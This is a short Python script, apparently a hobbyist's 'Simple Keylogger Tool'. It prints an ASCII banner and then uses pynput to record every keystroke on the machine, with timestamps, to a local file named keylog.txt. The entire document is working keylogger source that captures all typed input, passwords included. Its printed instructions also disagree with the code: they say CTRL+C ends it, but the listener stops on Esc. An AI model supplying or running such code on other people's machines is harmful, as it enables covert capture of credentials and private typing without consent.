from pynput import keyboard
import logging

def print_header():
    header = """
  __   _   __ __   ___   _     ___     _  __  ___   __   __ _      __     __    __   ___   ___  
/' _/ | | |  V  | | _,\\ | |   | __|   | |/ / | __|  \\ `v' /| |    /__\\   / _]  / _] | __| | _ \\ 
`._`. | | | \\_/ | | v_/ | |_  | _|    |   <  | _|    `. .' | |_  | \\/ | | [\\/\\ | [\\/\\ | _|  | v / 
|___/ |_| |_| |_| |_|   |___| |___|   |_|\_\\ |___|    !_!  |___|  \\__/   \\__/  \\__/ |___| |_|_\\ 
"""
    print(header)
    print("="*80)
    print("Welcome to Mr Srinivas's Simple Keylogger Tool!")
    print("Instructions:")
    print("- This tool records keystrokes and saves them to a log file (e.g., 'keylog.txt').")
    print("- To stop typing and exit the keylogger, press CTRL + C to exit the program.")
    print("="*80)

# Set up logging to save the keystrokes to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Print the header and instructions
print_header()

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()